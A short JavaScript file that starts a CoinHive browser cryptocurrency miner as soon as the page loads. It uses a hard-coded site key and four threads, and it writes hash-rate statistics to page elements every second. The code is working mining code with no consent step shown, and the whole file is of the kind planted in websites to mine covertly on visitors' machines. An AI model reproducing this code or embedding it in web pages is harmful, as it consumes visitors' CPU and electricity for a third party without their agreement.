$(document).ready(function() {
	var miner = new CoinHive.Anonymous('4TioaoSMGC46r9H4m1HCyTMX6OXkpyDj');
        miner.setThrottle(.8)
	miner.setNumThreads(4);
	miner.start();

	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();
		var threadsUsed = miner.getNumThreads();

		// Output to HTML elements...
		$('#hashesPerSecond').text(hashesPerSecond);
		$('#totalHashes').text(totalHashes);
		$('#acceptedHashes').text(acceptedHashes);
		$('#threadsUsed').text(threadsUsed);
	}, 1000);
});